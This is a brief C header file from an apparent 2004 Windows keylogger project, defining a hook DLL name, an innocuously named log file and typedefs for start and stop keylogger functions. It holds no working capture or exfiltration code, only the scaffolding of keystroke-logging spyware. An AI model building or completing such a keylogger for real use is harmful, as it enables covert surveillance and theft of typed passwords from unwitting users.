/*++ 

  Module Name:
  
	main.h

  Abstract:

	Header file with definitions for main.c

  Author:

	Daniel Koch (Backz)

  History:

	May-2004 Daniel K.
		Created.

--*/

#ifndef MAIN_H
#define MAIN_H

#define HOOK_DLL_FILE "pactus_dll.dll"
#define LOG_FILENAME "go_l.daf"
#define CALL __stdcall

// typedefs
typedef BOOL (CALL *STARTKEYLOGGER_T)(const char *, BOOL);
typedef BOOL (CALL *STOPKEYLOGGER_T)(void);


#endif
